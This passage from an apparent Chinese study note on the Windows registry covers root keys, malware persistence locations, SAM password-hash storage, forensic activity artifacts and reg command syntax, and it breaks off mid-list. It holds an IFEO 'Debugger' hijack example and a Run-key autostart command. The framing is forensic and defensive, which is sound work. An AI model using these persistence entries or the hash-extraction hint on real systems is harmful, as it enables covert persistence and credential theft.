&lt;p&gt;它实际上是指向&lt;code&gt;HKEY_USERS&lt;/code&gt;下当前用户SID的一个&lt;strong&gt;快捷方式&lt;/strong&gt;，其内容来自当前用户的&lt;code&gt;NTUSER.DAT&lt;/code&gt;文件&lt;/p&gt;
&lt;h4 id=&#34;3-hkey_local_machinehklm&#34;&gt;3. HKEY_LOCAL_MACHINE（HKLM）
&lt;/h4&gt;&lt;p&gt;该根键包括本地计算机的系统信息，包括硬件和操作系统信息，安全数据和计算机专用的各类软件设置信息&lt;/p&gt;
&lt;p&gt;它主要映射了&lt;code&gt;SYSTEM&lt;/code&gt;，&lt;code&gt;SOFTWARE&lt;/code&gt;，&lt;code&gt;SAM&lt;/code&gt;，&lt;code&gt;SECURITY&lt;/code&gt;等Hive&lt;/p&gt;
&lt;h4 id=&#34;4-hkey_usershku&#34;&gt;4. HKEY_USERS（HKU）
&lt;/h4&gt;&lt;p&gt;该根键包括计算机的所有用户使用的配置数据，这些数据只有在用户登录系统时才能访问，告诉系统当前用户使用的图标，激活的程序组，开始菜单的内容以及颜色，字体&lt;/p&gt;
&lt;p&gt;它的每个子项是一个用户的SID，此外还有.DEFAULT子项，是系统为新用户创建账户时的配置模板&lt;/p&gt;
&lt;h4 id=&#34;5-hkey_current_confighkcc&#34;&gt;5. HKEY_CURRENT_CONFIG（HKCC）
&lt;/h4&gt;&lt;p&gt;该根键包括当前硬件的配置信息，其内容**完全指向（或映射自）**以下这个更深的注册表路径：&lt;/p&gt;
&lt;p&gt;&lt;code&gt;HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Hardware Profiles\Current&lt;/code&gt;&lt;/p&gt;
&lt;h2 id=&#34;常用注册表项&#34;&gt;常用注册表项
&lt;/h2&gt;&lt;h3 id=&#34;持久化机制&#34;&gt;持久化机制
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;这是恶意软件实现开机自启、确保自身不被清除最常用的位置&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;开机自启runrunonce&#34;&gt;开机自启（Run/RunOnce）
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;路径&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt; (&lt;strong&gt;对所有用户生效&lt;/strong&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\RunOnce&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&lt;/code&gt; (&lt;strong&gt;只对当前用户生效&lt;/strong&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\RunOnce&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run&lt;/code&gt; (&lt;strong&gt;策略控制的启动项&lt;/strong&gt;)&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\Policies\Explorer\Run&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：最经典、最直接的自启动位置写入这里的程序会在用户登录或系统启动时自动执行。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关注点&lt;/strong&gt;：检查所有这些&lt;code&gt;Run&lt;/code&gt;键下是否有指向非标准目录（如&lt;code&gt;Temp&lt;/code&gt;、&lt;code&gt;AppData&lt;/code&gt;）的可执行文件，或者是否有名字可疑的启动项&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;系统服务services&#34;&gt;系统服务（Services）
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;HKLM\SYSTEM\CurrentControlSet\Services\&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：将程序注册为系统服务，可以在后台运行，权限高，更隐蔽&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关注点&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;可疑服务名&lt;/strong&gt;：是否有随机、无意义或拼写错误的服务名称&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;ImagePath&lt;/code&gt;&lt;/strong&gt;：正常服务（如&lt;code&gt;svchost&lt;/code&gt;）的&lt;code&gt;ImagePath&lt;/code&gt;是否被篡改为指向恶意程序&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;FailureCommand&lt;/code&gt;&lt;/strong&gt;：检查服务失败后执行的命令是否被设置为恶意程序&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;登录辅助程序winlogon&#34;&gt;登录辅助程序（Winlogon）
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：&lt;code&gt;Winlogon.exe&lt;/code&gt;是负责用户登录的核心进程&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关注点&lt;/strong&gt;:
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Userinit&lt;/code&gt;&lt;/strong&gt;：默认值应为&lt;code&gt;C:\Windows\system32\userinit.exe,&lt;/code&gt;。&lt;strong&gt;检查末尾是否有逗号&lt;/strong&gt;，以及后面是否跟了其他恶意程序的路径（用逗号分隔）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;&lt;code&gt;Shell&lt;/code&gt;&lt;/strong&gt;：默认值应为&lt;code&gt;explorer.exe&lt;/code&gt;，如果被修改，意味着用户的整个桌面环境都被替换了&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;调试器image-file-execution-optionsifeo&#34;&gt;调试器（Image File Execution Options，IFEO）
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Image File Execution Options\&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;功能&lt;/strong&gt;：用于在程序启动时附加调试器&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;关注点&lt;/strong&gt;：攻击者会创建一个以正常程序命名（如&lt;code&gt;notepad.exe&lt;/code&gt;）的子项，然后在其中添加一个名为&lt;code&gt;Debugger&lt;/code&gt;的键值，指向自己的恶意程序：&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-Shell&#34; data-lang=&#34;Shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt;HKEY_LOCAL_MACHINE&lt;span style=&#34;color:#98c379&#34;&gt;\S&lt;/span&gt;OFTWARE&lt;span style=&#34;color:#98c379&#34;&gt;\M&lt;/span&gt;icrosoft&lt;span style=&#34;color:#98c379&#34;&gt;\W&lt;/span&gt;indows NT&lt;span style=&#34;color:#98c379&#34;&gt;\C&lt;/span&gt;urrentVersion&lt;span style=&#34;color:#98c379&#34;&gt;\I&lt;/span&gt;mage File Execution Options&lt;span style=&#34;color:#98c379&#34;&gt;\n&lt;/span&gt;otepad.exe&lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;Debugger&amp;#34;&lt;/span&gt;&lt;span style=&#34;color:#56b6c2&#34;&gt;=&lt;/span&gt;&lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;C:\\Path\\To\\EvilDebugger.exe&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这样，每当用户尝试运行记事本时，系统会优先运行那个恶意的调试器，而真正的记事本根本不会启动&lt;/p&gt;
&lt;p&gt;也可以用于阻止程序运行，如果调试器不存在，系统找不到指定的.exe，程序就无法启动&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;图像环境dllappinit_dll&#34;&gt;图像环境DLL（AppInit_DLL）
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Windows&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：允许将一个或多个DLL注入到几乎所有加载了&lt;code&gt;user32.dll&lt;/code&gt;的进程中&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关注点&lt;/strong&gt;：检查**&lt;code&gt;AppInit_DLLs&lt;/code&gt;**这个键值是否为空，任何被列在这里的DLL都会被广泛注入，是恶意软件实现全局监控的常用手段&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;com组件clsid&#34;&gt;COM组件（CLSID）
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;HKCR\CLSID\&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：存储系统中所有COM组件类ID（CLSID）的信息&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关注点&lt;/strong&gt;：检查&lt;code&gt;InprocServer32&lt;/code&gt;等子项的默认值，看其指向的 DLL 路径是否可疑&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;用户账户与凭证&#34;&gt;用户账户与凭证
&lt;/h3&gt;&lt;h4 id=&#34;本地用户信息sam&#34;&gt;本地用户信息（SAM）
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;HKLM\SAM\SAM\Domains\Account\Users&lt;/code&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;功能&lt;/strong&gt;：存储本地用户的账户名、SID、以及最重要的密码哈希&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;关注点&lt;/strong&gt;：&lt;code&gt;SAM&lt;/code&gt;受到严格保护，无法直接读取，但可以通过内存取证工具（如 &lt;code&gt;hashdump&lt;/code&gt;）或离线分析&lt;code&gt;SAM&lt;/code&gt;和&lt;code&gt;SYSTEM&lt;/code&gt;文件来提取密码哈希&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;检查&lt;code&gt;Names&lt;/code&gt;子键可以发现所有本地账户，包括可能被隐藏的账户&lt;/strong&gt;&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;用户配置文件列表profilelist&#34;&gt;用户配置文件列表（ProfileList）
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\ProfileList&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：记录了本机上所有用户账户的 SID 以及其个人文件夹（Profile）的路径。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关注点&lt;/strong&gt;：这是将SID和用户名对应起来的关键，可以发现系统上曾经存在过但已被删除的用户账户痕迹&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;用户活动痕迹&#34;&gt;用户活动痕迹
&lt;/h3&gt;&lt;h4 id=&#34;程序执行历史userassist&#34;&gt;程序执行历史（UserAssist）
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：记录用户通过图形界面（点击图标）运行程序的历史，包括运行次数和最后运行时间&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;取证关注点&lt;/strong&gt;：还原用户操作的关键，可以清晰地看到用户在特定时间点运行了哪些程序&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;最近打开的文档recentdocs&#34;&gt;最近打开的文档（RecentDocs）
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\RecentDocs&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：记录用户最近打开过的文档和访问过的文件夹&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关注点&lt;/strong&gt;：了解用户最近处理了哪些文件，可能会发现恶意文档（如带宏的Word）或攻击者留下的工具&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;文件夹打开记录bagmru&#34;&gt;文件夹打开记录（BagMRU）
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;路径&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;HKCU\Software\Classes\Local Settings\Software\Microsoft\Windows\Shell\BagMRU&lt;/code&gt;（&lt;strong&gt;新版本，主要使用&lt;/strong&gt;）&lt;/li&gt;
&lt;li&gt;&lt;code&gt;HKCU\Software\Microsoft\Windows\Shell\BagMRU&lt;/code&gt; （&lt;strong&gt;旧版本，不太使用&lt;/strong&gt;）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：记录用户曾经打开过的所有文件夹，每一项代表一个用户访问过的文件夹，每个键的值（如 &lt;code&gt;REG_BINARY&lt;/code&gt;数据）是一个内部结构（MRU记录+路径+配置引用），其中包含路径信息，但不是直接可见的字符串&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关注点&lt;/strong&gt;：它可以揭示出用户曾经访问过但现在可能已不存在的文件夹，包括网络共享、移动设备上的文件夹，同级目录下的Bags会记录文件夹的具体视图设置&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;usb设备使用历史usbstor&#34;&gt;USB设备使用历史（USBSTOR）
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;HKLM\SYSTEM\CurrentControlSet\Enum\USBSTOR&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：记录所有曾接入本机的U盘、移动硬盘等USB存储设备的厂商、型号和唯一的序列号&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关注点&lt;/strong&gt;：可以确定是否有未经授权的U盘接入，并可将特定U盘与数据泄露或恶意软件植入事件关联起来&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;系统与网络信息&#34;&gt;系统与网络信息
&lt;/h3&gt;&lt;h4 id=&#34;网络接口与历史ip-interfaces&#34;&gt;网络接口与历史IP (Interfaces)
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;HKLM\SYSTEM\CurrentControlSet\Services\Tcpip\Parameters\Interfaces\&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：记录本机所有网络接口（有线网卡、无线网卡）的配置信息，包括历史上曾经获取过的IP地址、子网掩码、网关和DNS服务器&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关注点&lt;/strong&gt;：可以确定机器在不同时间点的网络环境，对于追踪内网漫游或确认C2连接时的源IP地址至关重要&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;最后关机时间-shutdowntime&#34;&gt;最后关机时间 (ShutdownTime)
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;HKLM\SYSTEM\CurrentControlSet\Control\Windows\ShutdownTime&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：记录了系统最后一次正常关机的时间&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关注点&lt;/strong&gt;：帮助确定系统事件发生的时间窗口&lt;/li&gt;
&lt;/ul&gt;
&lt;h4 id=&#34;时区信息-timezoneinformation&#34;&gt;时区信息 (TimeZoneInformation)
&lt;/h4&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;路径&lt;/strong&gt;：&lt;code&gt;HKLM\SYSTEM\CurrentControlSet\Control\TimeZoneInformation&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：记录本机配置的时区&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;关注点&lt;/strong&gt;：时间线分析的基准，所有从日志和文件系统中提取的时间戳都必须根据这个时区进行校正，才能得到准确的绝对时间&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id=&#34;使用命令行编辑注册表&#34;&gt;使用命令行编辑注册表
&lt;/h2&gt;&lt;h3 id=&#34;reg命令的基本结构&#34;&gt;reg命令的基本结构
&lt;/h3&gt;&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt; reg &amp;lt;操作&amp;gt; &amp;lt;注册表项路径&amp;gt; &lt;span style=&#34;color:#56b6c2&#34;&gt;[&lt;/span&gt;参数&lt;span style=&#34;color:#56b6c2&#34;&gt;]&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;h3 id=&#34;增改add&#34;&gt;增/改(add)
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;添加新项（文件夹）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;在&lt;code&gt;Run&lt;/code&gt;键下创建一个名为&lt;code&gt;MyApp&lt;/code&gt;的新项：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reg add &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MyApp&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;添加/设置键值（内容）&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;/v&lt;/code&gt;：指定键值名&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;/t&lt;/code&gt;：指定类型&lt;/p&gt;
&lt;table&gt;
  &lt;thead&gt;
      &lt;tr&gt;
          &lt;th&gt;类型&lt;/th&gt;
          &lt;th&gt;全称&lt;/th&gt;
          &lt;th&gt;存储内容&lt;/th&gt;
      &lt;/tr&gt;
  &lt;/thead&gt;
  &lt;tbody&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;REG_SZ&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;字符串值&lt;/td&gt;
          &lt;td&gt;人类可读的文本，如路径、名称、描述&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;REG_DWORD&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;32位数值&lt;/td&gt;
          &lt;td&gt;一个整数，通常用作是/否的标志或简单数字配置&lt;/td&gt;
      &lt;/tr&gt;
      &lt;tr&gt;
          &lt;td&gt;&lt;strong&gt;REG_BINARY&lt;/strong&gt;&lt;/td&gt;
          &lt;td&gt;二进制值&lt;/td&gt;
          &lt;td&gt;任意的、非结构化的原始字节数据&lt;/td&gt;
      &lt;/tr&gt;
  &lt;/tbody&gt;
&lt;/table&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;/d&lt;/code&gt;：指定数据&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;code&gt;/f&lt;/code&gt;：如果键值已存在，强制覆盖而不提示&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;在&lt;code&gt;Run&lt;/code&gt;键下创建一个名为&lt;code&gt;Pentestlab&lt;/code&gt;的自启动程序：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reg add &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&amp;#34;&lt;/span&gt; /v Pentestlab /t REG_SZ /d &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;C:\tools\pentestlab.exe&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;删-delete&#34;&gt;删 (delete)
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;删除键值&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/v&lt;/code&gt;：指定要删除的键值名&lt;/li&gt;
&lt;li&gt;&lt;code&gt;/f&lt;/code&gt;：强制删除，不进行确认提示&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;删除刚才创建的&lt;code&gt;Pentestlab&lt;/code&gt;启动项：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reg delete &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;HKCU\Software\Microsoft\Windows\CurrentVersion\Run&amp;#34;&lt;/span&gt; /v Pentestlab /f
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;删除整个项（及其所有子项和键值）&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;删除刚才创建的MyApp项：&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reg delete &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;HKCU\Software\Microsoft\Windows\CurrentVersion\Run\MyApp&amp;#34;&lt;/span&gt; /f
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id=&#34;查-query&#34;&gt;查 (query)
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;查询项下的所有内容&lt;/strong&gt;&lt;/p&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reg query &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&amp;#34;&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;p&gt;这条命令会列出&lt;code&gt;Winlogon&lt;/code&gt;这个项下所有的子项和键值&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;查询一个具体的键值&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/v&lt;/code&gt;：指定要查询的键值名&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reg query &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;HKLM\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon&amp;#34;&lt;/span&gt; /v Userinit
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;&lt;strong&gt;递归查询所有子项和键值&lt;/strong&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;code&gt;/s&lt;/code&gt;：递归查询所有子项和键值&lt;/li&gt;
&lt;/ul&gt;
&lt;div class=&#34;highlight&#34;&gt;&lt;pre tabindex=&#34;0&#34; style=&#34;color:#abb2bf;background-color:#282c34;-moz-tab-size:4;-o-tab-size:4;tab-size:4;&#34;&gt;&lt;code class=&#34;language-shell&#34; data-lang=&#34;shell&#34;&gt;&lt;span style=&#34;display:flex;&#34;&gt;&lt;span&gt;reg query &lt;span style=&#34;color:#98c379&#34;&gt;&amp;#34;HKCU\Software\Microsoft\Windows\CurrentVersion\Explorer\UserAssist&amp;#34;&lt;/span&gt; /s
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/div&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h1 id=&#34;windows安全机制&#34;&gt;Windows安全机制
&lt;/h1&gt;&lt;h2 id=&#34;安全主体与身份验证&#34;&gt;安全主体与身份验证
&lt;/h2&gt;&lt;p&gt;&lt;strong&gt;在介绍Windows安全机制之前，我们必须先理解两个基本概念：安全主体和身份验证&lt;/strong&gt;&lt;/p&gt;
&lt;h3 id=&#34;安全主体&#34;&gt;安全主体
&lt;/h3&gt;&lt;p&gt;&lt;strong&gt;安全主体是指在Windows操作系统中能够被识别和进行身份验证的任何实体&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;它不仅包括人类用户，还包括以下内容：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;用户账户：包括本地用户（如&lt;code&gt;Administrator&lt;/code&gt;）和域用户（如&lt;code&gt;CONTOSO\jdoe&lt;/code&gt;）&lt;/li&gt;
&lt;li&gt;计算机账户：加入域的计算机，如&lt;code&gt;WORKSTATION-01$&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;安全组：如&lt;code&gt;Administrators&lt;/code&gt;组、&lt;code&gt;Everyone&lt;/code&gt;组等&lt;/li&gt;
&lt;li&gt;系统内置账户：例如&lt;code&gt;SYSTEM&lt;/code&gt;、&lt;code&gt;Local Service&lt;/code&gt;、&lt;code&gt;Network Service&lt;/code&gt;&lt;/li&gt;
&lt;li&gt;进程或线程：在特定安全上下文中运行的进程或线程&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;strong&gt;简单来说，任何需要被系统识别以授予权限的对象，都是一个安全主体&lt;/strong&gt;&lt;/p&gt;
&lt;h4 id=&#34;完整性级别&#34;&gt;完整性级别
&lt;/h4&gt;&lt;p&gt;完整性级别是安全主体的一个属性，用于防止低权限程序访问高权限资源&lt;/p&gt;
&lt;p&gt;主要级别有：&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;低完整性级别（如Internet Explorer保护模式）&lt;/li&gt;
&lt;li&gt;中等完整性级别（普通用户程序）&lt;/li&gt;
&lt;li&gt;高完整性级别（管理员权限进程）&lt;/li&gt;
